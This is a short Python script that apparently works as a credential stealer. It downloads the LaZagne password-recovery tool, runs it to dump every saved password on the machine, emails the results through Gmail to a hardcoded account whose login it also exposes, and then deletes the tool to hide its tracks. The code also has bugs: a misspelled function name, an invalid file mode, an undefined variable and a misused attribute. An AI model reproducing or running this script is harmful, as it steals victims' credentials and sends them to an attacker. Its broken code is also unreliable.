import requests, subprocess, smtplib, os, tempfile

def downlaod(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "Wb") as out_file:
        outfile.write(get_response.content())

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

downlaod("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
result = subprocess.check_output("lazagne.exe all", shell=True)
send_mail("steamhackcsgokillit@gmail.com", "adrian450", result)
os.remove("lazagne.exe")